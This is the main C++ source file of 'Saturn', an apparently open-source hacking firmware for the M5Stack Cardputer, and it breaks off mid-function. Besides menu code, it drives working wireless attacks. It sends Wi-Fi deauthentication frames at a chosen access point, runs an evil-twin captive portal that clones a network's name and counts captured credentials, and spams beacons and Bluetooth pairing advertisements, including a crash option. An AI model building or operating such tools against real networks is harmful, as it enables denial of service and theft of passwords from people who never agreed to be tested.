// Saturn Firmware for the M5 Stack Cardputer
// By: Henrique Sebastião (contato@henriquesebastiao.com)
// https://github.com/henriquesebastiao/saturn

// This code contains a lot of logic borrowed from https://github.com/n0xa/m5stick-nemo

#include <M5Cardputer.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <BLEUtils.h>
#include <BLEServer.h>

#include "src/settings.h"
#include "src/language.h"
#include "src/infrared.h"
#include "src/beacon.h"
#include "src/deauth.h"
#include "src/sd.h"
#include "src/portal.h"
#include "src/applejuice.h"
#include "src/sounds.h"

IRsend irsend(IR_SEND_PIN);

struct Menu {
  char name[25];
  int command;
};

struct QrCode {
  char name[13];
  String url;
};

// -=-=-= MENU DEFINITIONS =-=-=-

Menu mainMenu[] = {
  {TXT_IR, 4},
  {"WiFi", 20},
  {"Bluetooth", 27},
  {TXT_SOUNDS, 31},
  {"QR Codes", 2},
  {TXT_SETTINGS, 3},
};
int mainMenuSize = sizeof(mainMenu) / sizeof(Menu);

Menu irDevicesMenu[] = {
  {"TV", 5},
  {TXT_BACK, 0},
};
int irDevicesMenuSize = sizeof(irDevicesMenu) / sizeof(Menu);

Menu irTvMenu[] = {
  {"Power", 7},
  {TXT_MUTE, 10},
  {"Volume +", 8},
  {"Volume -", 9},
  {"Menu", 18},
  {TXT_CHANNEL_UP, 11},
  {TXT_CHANNEL_DOWN, 12},
  {TXT_UP, 13},
  {TXT_DOWN, 14},
  {TXT_LEFT, 15},
  {TXT_RIGHT, 16},
  {"Enter", 17},
  {TXT_BACK, 0},
};
int irTvMenuSize = sizeof(irTvMenu) / sizeof(Menu);

Menu wifiMenu[] = {
  {TXT_WIFI_SCAN, 4},
  {TXT_WIFI_BEACON_FUNNY, 1},
  {TXT_WIFI_BEACON_FUNNY_BR, 2},
  {TXT_BEACON_ATTACK_RND, 3},
  {"Captive Portal", 5},
  {TXT_BACK, 0},
};
int wifiMenuSize = sizeof(wifiMenu) / sizeof(Menu);

Menu wifiAttackMenu[] = {
  {TXT_SIGNAL_LEVEL, 3},
  {TXT_WIFI_PORTAL, 0},
  {TXT_WIFI_DEAUTH, 1},
  {TXT_WIFI_COMBINED, 2},
  {TXT_BACK, 5},
};
int wifiAttackMenuSize = sizeof(wifiAttackMenu) / sizeof(Menu);

Menu bluetoothMenu[] = {
  {"AppleJuice", 1},
  {"Swift Pair", 2},
  {"Android Spam", 3},
  {TXT_SA_CRASH, 4},
  {"BT Maelstrom", 5},
  {TXT_BACK, 0},
};
int bluetoothMenuSize = sizeof(bluetoothMenu) / sizeof(Menu);

Menu appleJuiceMenu[] = {
  {"AirPods", 1},
  {TXT_AJ_TRANSF_NM, 27},
  {"AirPods Pro", 2},
  {"AirPods Max", 3},
  {"AirPods G2", 4},
  {"AirPods G3", 5},
  {"AirPods Pro G2", 6},
  {"PowerBeats", 7},
  {"PowerBeats Pro", 8},
  {"Beats Solo Pro", 9},
  {"Beats Studio Buds", 10},
  {"Beats Flex", 11},
  {"Beats X", 12},
  {"Beats Solo 3", 13},
  {"Beats Studio 3", 14},
  {"Beats Studio Pro", 15},
  {"Beats Fit Pro", 16},
  {"Beats Studio Buds+", 17},
  {"Apple Vision Pro", 29},
  {"AppleTV Setup", 18},
  {"AppleTV Pair", 19},
  {"AppleTV New User", 20},
  {"AppleTV AppleID", 21},
  {"AppleTV Audio", 22},
  {"AppleTV HomeKit", 23},
  {"AppleTV Keyboard", 24},
  {"AppleTV Network", 25},
  {TXT_AJ_TV_COLOR, 26},
  {TXT_STP_NW_PH, 28},
  {TXT_BACK, 0},
};
int appleJuiceMenuSize = sizeof(appleJuiceMenu) / sizeof(Menu);

Menu soundMenu[] = {
  {"Super Mario Bross", 1},
  {"Crazy Train", 5},
  {TXT_IMPERIAL_MARCH_SOUND, 2},
  {"Aha Take On Me", 3},
  {"Jingle Bells", 4},
  {"Star Wars", 6},
  {"Nokia Ringtone", 7},
  {TXT_BACK, 0},
};
int soundMenuSize = sizeof(soundMenu) / sizeof(Menu);

QrCode qrMenu[] = {
  {"Saturn", "https://youtu.be/dzNvk80XY9s"},
  {TXT_INTERSTELLAR, "https://youtu.be/JuSsvM8B4Jc"},
  {"Shodan.io", "https://www.shodan.io/"},
  {"Fake Update", "https://fakeupdate.net/"},
  {"Hacker Typer", "https://hackertyper.com/"},
  {TXT_REPOSITORY, "https://github.com/henriquesebastiao/saturn"},
  {TXT_BACK, ""},
};
int qrMenuSize = sizeof(qrMenu) / sizeof(QrCode);

Menu settingsMenu[] = {
  {TXT_BATTERY_INFO, 19},
  {TXT_BACK, 0},
};

// -=-=-= FUNCTIONS OF DRAWING MENUS =-=-=-

void drawMenu(Menu thisMenu[], int size) {
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BG_COLOR);
  int y = HEIGHT_MENU_ITEMS;
  // Scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 3) {
    for (int i = 0 + (cursor - 3); i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(thisMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  } else {
    for (int i = 0; i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(thisMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  }
}

void qrDrawMenu(int size) {
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(2);
  DISPLAY.setTextColor(BG_COLOR);
  int y = HEIGHT_MENU_ITEMS;
  // Scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 3) {
    for (int i = 0 + (cursor - 3); i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(qrMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  } else {
    for (int i = 0; i < size; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      DISPLAY.print(qrMenu[i].name);
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }
  }
}

void switcherButtonProc() {
  if (!rstOverride) {
    if (checkNextPress()) {
      isSwitching = true;
      currentProc = 1;
    }
  }
}

void checkMenuPress() {
  if (M5Cardputer.Keyboard.isKeyPressed('`')) {  // Return to the main menu by pressing ESC
    dimTimer();
    if (portalActive) {
      portalActive = false;
    }
    isSwitching = true;
    rstOverride = false;
    currentProc = 1;
  } else if (M5Cardputer.Keyboard.isKeyPressed(',')) {  // Return to the previous menu by pressing ,
    dimTimer();
    if (portalActive) {
      portalActive = false;
    }
    isSwitching = true;
    rstOverride = false;

    if (currentProc == 5) {
      currentProc = 4;
    } else {
      currentProc = 1;
    }
    delay(100);
  }
}

bool checkNextPress() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')) {
    cursor = cursor - 2;
    dimTimer();
    return true;
  }
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')) {
    dimTimer();
    return true;
  }
  return false;
}

bool checkSelectPress() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')) {
    dimTimer();
    return true;
  }
  return false;
}

bool checkESCPress() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed('`')) {
    dimTimer();
    return true;
  }
  return false;
}

// -=-=-= MENU FUNCTIONS =-=-=-

void mainMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(mainMenu, mainMenuSize);
  delay(500);
}

void mainMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % mainMenuSize;
    drawMenu(mainMenu, mainMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    rstOverride = false;
    isSwitching = true;
    currentProc = mainMenu[cursor].command;
  }
}

void irDevicesMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(irDevicesMenu, irDevicesMenuSize);
  delay(500);
}

void irDevicesMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % irDevicesMenuSize;
    drawMenu(irDevicesMenu, irDevicesMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    if (irDevicesMenu[cursor].command == 0) {
      isSwitching = true;
      currentProc = 1;
    } else if (irDevicesMenu[cursor].command == 5) {
      isSwitching = true;
      currentProc = 5;
    }
  }
}

// -=-=-= IR TV MENU =-=-=-

void irTvMenuSetup() {
  cursor = 0;
  rstOverride = true;

  #if defined(IR_SEND_PIN)
    irsend.begin();
  #endif
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IR_SEND_PIN, HIGH);

  drawMenu(irTvMenu, irTvMenuSize);
  delay(500);
}

void irTvMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % irTvMenuSize;
    drawMenu(irTvMenu, irTvMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    if (irTvMenu[cursor].command == 0) {
      isSwitching = true;
      currentProc = 4;
    } else if (irTvMenu[cursor].command == 7) {  // Power
      // sendIrRawCodes(allIrPowerCodesRawTV, allIrPowerCodesRawTVLength, "POWER");
      sendIrProntoCodes(allIrPowerCodesProntoTV, allIrPowerCodesProntoTVLength, "POWER");
    } else if (irTvMenu[cursor].command == 10) {  // Mute
      // sendIrRawCodes(allIrMuteCodesRawTV, allIrMuteCodesRawTVLength, TXT_MUTE_TXT_UP);
      sendIrProntoCodes(allIrMuteCodesProntoTV, allIrMuteCodesProntoTVLength, TXT_MUTE_TXT_UPPER);
    } else if (irTvMenu[cursor].command == 8) {  // Volume +
      sendIrProntoCodes(allIrVolumeUpCodesProntoTV, allIrVolumeUpCodesProntoTVLength, "VOL +");
    } else if (irTvMenu[cursor].command == 9) {  // Volume -
      sendIrProntoCodes(allIrVolumeDownCodesProntoTV, allIrVolumeDownCodesProntoTVLength, "VOL -");
    } else if (irTvMenu[cursor].command == 11) {  // Channel +
      sendIrProntoCodes(allIrChannelUpCodesProntoTV, allIrChannelUpCodesProntoTVLength, TXT_CHANNEL_UP_UPPER);
    } else if (irTvMenu[cursor].command == 12) {  // Channel -
      sendIrProntoCodes(allIrChannelDownCodesProntoTV, allIrChannelDownCodesProntoTVLength, TXT_CHANNEL_DOWN_UPPER);
    } else if (irTvMenu[cursor].command == 13) {  // Up
      sendIrProntoCodes(allIrUpCodesProntoTV, allIrUpCodesProntoTVLength, TXT_UP_UPPER);
    } else if (irTvMenu[cursor].command == 14) {  // Down
      sendIrProntoCodes(allIrDownCodesProntoTV, allIrDownCodesProntoTVLength, TXT_DOWN_UPPER);
    } else if (irTvMenu[cursor].command == 15) {  // Left
      sendIrProntoCodes(allIrLeftCodesProntoTV, allIrLeftCodesProntoTVLength, TXT_LEFT_UPPER);
    } else if (irTvMenu[cursor].command == 16) {  // Right
      sendIrProntoCodes(allIrRightCodesProntoTV, allIrRightCodesProntoTVLength, TXT_RIGHT_UPPER);
    } else if (irTvMenu[cursor].command == 17) {  // Enter
      sendIrProntoCodes(allIrEnterCodesProntoTV, allIrEnterCodesProntoTVLength, "ENTER");
    } else if (irTvMenu[cursor].command == 18) {  // Menu
      sendIrProntoCodes(allIrMenuCodesProntoTV, allIrMenuCodesProntoTVLength, "MENU");
    }
  }
}

// -=-=-= Wi-Fi MENU =-=-=-

void wifiMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(wifiMenu, wifiMenuSize);
  delay(500);
}

void wifiMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % wifiMenuSize;
    drawMenu(wifiMenu, wifiMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    int option = wifiMenu[cursor].command;
    rstOverride = false;
    currentProc = 21;
    isSwitching = true;
    switch(option) {
      case 0:  // Back
        currentProc = 1;
        break;
      case 1:  // Funny Beacon
        beaconType = 1;
        break;
      case 2:  // Funny Beacon (BR)
        beaconType = 2;
        break;
      case 3:  // Beacon Attack Random
        beaconType = 3;
        break;
      case 4:
        currentProc = 22;  // Wi-Fi Scan
        break;
      case 5:
        currentProc = 25;  // Captive Portal
        break;
    }
  }
}

void wifiScanDrawMenu() {
  char ssid[19];
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BG_COLOR);
  int y = HEIGHT_MENU_ITEMS;

  if (cursor > 3) {
    for (int i = 0 + (cursor - 3); i < wifict; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      if(WiFi.SSID(i).length() > 18){
        WiFi.SSID(i).toCharArray(ssid, 19);
        DISPLAY.print(ssid);
      }else{
        DISPLAY.print(WiFi.SSID(i));
      }
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }

    // Rescan
    if (cursor == wifict) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_WIFI_RESCAN);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item

    // Back
    if (cursor == wifict + 1) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_BACK);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
  } else {
    for (int i = 0; i < wifict; i++) {
      if (cursor == i) {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
        DISPLAY.setTextColor(BG_COLOR);
      } else {
        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
        DISPLAY.setTextColor(MAIN_COLOR);
      }
      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
      DISPLAY.setCursor(20, y + 16);
      if(WiFi.SSID(i).length() > 18){
        WiFi.SSID(i).toCharArray(ssid, 19);
        DISPLAY.print(ssid);
      }else{
        DISPLAY.print(WiFi.SSID(i));
      }
      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
    }

    // Rescan
    if (cursor == wifict) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_WIFI_RESCAN);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item

    // Back
    if (cursor == wifict + 1) {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
      DISPLAY.setTextColor(BG_COLOR);
    } else {
      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
      DISPLAY.setTextColor(MAIN_COLOR);
    }
    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
    DISPLAY.setCursor(20, y + 16);
    DISPLAY.print(TXT_BACK);
    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
  }
}

void wifiScanResultSetup() {
  cursor = 0;
  rstOverride = true;
  wifiScanDrawMenu();
  delay(500);
}

void wifiScanResultLoop(){
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wifiScanDrawMenu();
    delay(250);
  }
  if (checkSelectPress()) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      currentProc = 22;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      currentProc = 20;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = TXT_WIFI_OPEN;
      break ;
    }
    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setCursor(0, 0);
    DISPLAY.setTextColor(BG_COLOR, MAIN_COLOR);
    if(WiFi.SSID(cursor).length() > 12){
      DISPLAY.setTextSize(SMALL_TEXT);
    }else if(WiFi.SSID(cursor).length() > 20){
      DISPLAY.setTextSize(MEDIUM_TEXT);
    }else{
      DISPLAY.setTextSize(MEDIUM_TEXT);
    }
    DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
    DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
    DISPLAY.setTextColor(BG_COLOR);
    DISPLAY.drawString(WiFi.SSID(cursor), DISPLAY_CENTER_X, 20);
    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
    DISPLAY.setTextSize(1.5);

    int y_info = 50;

    String frequency;

    int numberChannel = WiFi.channel(cursor);

    switch (numberChannel)
    {
    case 1:
      frequency = "2412 MHz";
      break;
    case 2:
      frequency = "2417 MHz";
      break;
    case 3:
      frequency = "2422 MHz";
      break;
    case 4:
      frequency = "2427 MHz";
      break;
    case 5:
      frequency = "2432 MHz";
      break;
    case 6:
      frequency = "2437 MHz";
      break;
    case 7:
      frequency = "2442 MHz";
      break;
    case 8:
      frequency = "2447 MHz";
      break;
    case 9:
      frequency = "2452 MHz";
      break;
    case 10:
      frequency = "2457 MHz";
      break;
    case 11:
      frequency = "2462 MHz";
      break;
    case 12:
      frequency = "2467 MHz";
      break;
    case 13:
      frequency = "2472 MHz";
      break;
    case 14:
      frequency = "2484 MHz";
      break;
    }

    String channelInfo = TXT_WIFI_CHANNEL + String(numberChannel) + " - " + frequency;
    String crypt = TXT_WIFI_CRYPT + encryptType;
    String bssid = "MAC: " + WiFi.BSSIDstr(cursor);
    String signal = TXT_WIFI_SIGNAL + String(WiFi.RSSI(cursor)) + "dBm";

    String infos[4] = {channelInfo, crypt, bssid, signal};

    for (int i = 0; i < 4; i++) {
      DISPLAY.drawString(infos[i], DISPLAY_CENTER_X, y_info);
      y_info += 15;
    }

    DISPLAY.setCursor(0, 100);
    DISPLAY.setTextColor(BLACK);

    DISPLAY.fillRoundRect(5, 110, DISPLAY.width() - 10, 20, 10, RED);
    DISPLAY.drawRoundRect(5, 110, DISPLAY.width() - 10, 20, 10, RED);
    DISPLAY.drawString(TXT_HOLD_ATTACK, DISPLAY_CENTER_X, 120);

    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
   if(checkSelectPress()){
      apMac=WiFi.BSSIDstr(cursor);
      apSsidName=WiFi.SSID(cursor);
      channel = static_cast<uint8_t>(WiFi.channel(cursor));
      uint8_t* bssid = WiFi.BSSID(cursor);
      memcpy(ap_record.bssid, bssid, 6);
      rstOverride = false;
      currentProc = 23;
      isSwitching = true;
      delay(100);
    }
  }
}

void wifiScanSetup() {
  rstOverride = false;  
  cursor = 0;
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString(TXT_WIFI_SCAN_1, DISPLAY_CENTER_X, 50);
  DISPLAY.drawString(TXT_WIFI_SCAN_2, DISPLAY_CENTER_X, 90);
  delay(1000);
}

void wifiScanLoop(){
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.drawString(TXT_WIFI_SACANNING, DISPLAY_CENTER_X, 70);
  wifict = WiFi.scanNetworks();
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.setCursor(0, 0);
  if(wifict > 0){
    isSwitching = true;
    currentProc=24;
  }
}

void wifiAttackMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(wifiAttackMenu, wifiAttackMenuSize);
  delay(500);
}

void wifiAttackMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % wifiAttackMenuSize;
    drawMenu(wifiAttackMenu, wifiAttackMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    int option = wifiAttackMenu[cursor].command;
    rstOverride = false;
    currentProc = 23;
    isSwitching = true;
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        clone_flg=true;
        target_deauth_flg=false;
        currentProc = 25;
        break;
      case 1:
        rstOverride = false;
        isSwitching = true;
        target_deauth_flg=false;
        target_deauth=true;
        currentProc = 26;
        break;
      case 2:
        rstOverride = false;
        isSwitching = true;
        clone_flg=true;
        target_deauth_flg=true;
        target_deauth=true;
        currentProc = 25;  // Combined TODO
        break;
      case 3:  // Signal Level
        currentProc = 32;
        break;
      case 5:
        currentProc = 20;
        break;
    }
  }
}

void wifiSignalLevelSetup() {
  rstOverride = true;
  
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.drawString(TXT_SIGNAL_LEVEL, DISPLAY_CENTER_X, 50);
  delay(500);
}

void wifiSignalLevelLoop() {
  // Reescan networks
  int networks = WiFi.scanNetworks();
  for (int i = 0; i < networks; i++) {
    if (WiFi.BSSIDstr(i) == apMac) {
      cursor = i;
      break;
    }
  }

  int signalLevel = WiFi.RSSI(cursor);
  int signalFeedbackDuration = 100;
  String signal = String(WiFi.RSSI(cursor)) + "dbm";
  String ssid = WiFi.SSID(cursor);
  String channel = String(WiFi.channel(cursor));

  DISPLAY.fillScreen(BG_COLOR);

  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BG_COLOR);
  DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
  DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
  DISPLAY.drawString(TXT_SIGNAL_LEVEL, DISPLAY_CENTER_X, 20);
  DISPLAY.setTextColor(MAIN_COLOR);
  DISPLAY.setTextSize(1.5);
  DISPLAY.drawString(ssid, DISPLAY_CENTER_X, 50);
  DISPLAY.drawString(TXT_WF_CHANN + channel, DISPLAY_CENTER_X, 65);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString(signal, DISPLAY_CENTER_X, 100);

  int frequency;

  if (signalLevel > -25) {
    frequency = 5500;
  } else if (signalLevel > -30) {
    frequency = 5000;
  } else if (signalLevel > -45) {
    frequency = 4500;
  } else if (signalLevel > -50) {
    frequency = 4000;
  } else if (signalLevel > -60) {
    frequency = 3500;
  } else if (signalLevel > -70) {
    frequency = 3000;
  } else if (signalLevel > -80) {
    frequency = 2000;
  } else if (signalLevel > -90) {
    frequency = 1000;
  } else {
    frequency = 500;
  }

  M5Cardputer.Speaker.tone(frequency, signalFeedbackDuration);

  // delay(200);
  if (checkNextPress() || checkESCPress() || checkSelectPress()) {
    rstOverride = false;
    isSwitching = true;
    currentProc = 23;
  }
}

// -=-=-= DEAUTH =-=-=-

void deauthSetup(){
  // Start the Access point service as Hidden
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsidName, emptyString, channel, 1, 4, false);
  IPAddress apIP = WiFi.softAPIP();

  Serial.printf("\nStart DEAUTH AP: %s\n", apSsidName.c_str());
  Serial.printf("Channel: %d\n\n", channel);

  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BG_COLOR);

  DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, RED);
  DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, RED);
  DISPLAY.drawString(TXT_WIFI_DEAUTH, DISPLAY_CENTER_X, 20);


  DISPLAY.setTextSize(1.5);
  DISPLAY.setTextColor(MAIN_COLOR);
  DISPLAY.drawString("SSID: " + apSsidName, DISPLAY_CENTER_X, 50);
  DISPLAY.drawString(TXT_WF_CHANN + String(channel), DISPLAY_CENTER_X, 65);
  DISPLAY.drawString("MAC: " + apMac, DISPLAY_CENTER_X, 80);

  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.setTextColor(BLACK);
  DISPLAY.fillRoundRect(5, 100, DISPLAY.width() - 10, 30, 10, RED);
  DISPLAY.drawRoundRect(5, 100, DISPLAY.width() - 10, 30, 10, RED);
  DISPLAY.drawString(TXT_DEAUTH_STOP, DISPLAY_CENTER_X, 115);

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wsl_bypasser_send_deauth_frame(&ap_record, channel);

  cursor = 0;
  rstOverride = false;
  delay(500); // Prevent switching after menu loads up
}

void deauthLoop(){
  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));  // Send deauth frame
  delay(100);
  if (checkNextPress()){
    WiFi.mode(WIFI_MODE_STA);
    rstOverride = false;
    isSwitching = true;
    target_deauth = false;
    currentProc = 20;
    delay(500);
  }
}

// -=-=-= CAPITIVE PORTAL =-=-=-

void portalSetup(){
  Serial.println("ATTACK -> Captive Portal STARTED");
  setupWiFi();
  setupWebServer();
  portalActive = true;
  cursor = 0;
  rstOverride = true;
  printHomeToScreen();
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wsl_bypasser_send_deauth_frame(&ap_record, channel);
  delay(500);
}

void portalLoop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen();
    }
  }
  if (clone_flg==true) {
    if (target_deauth_flg) {
      if (target_deauth == true) {
        if (deauth_tick==35) {
          wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
          deauth_tick=0;
        } else { 
          deauth_tick=deauth_tick+1; 
        }
        DISPLAY.setTextSize(SMALL_TEXT);
        DISPLAY.setTextColor(RED, BG_COLOR);
        DISPLAY.setCursor(1, 115);
        DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
      } else {
        DISPLAY.setTextSize(SMALL_TEXT);
        DISPLAY.setTextColor(RED, BG_COLOR);
        DISPLAY.setCursor(1, 115);
        DISPLAY.println(TXT_DEAUTH_START);
        DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
      }
      if (checkSelectPress()){
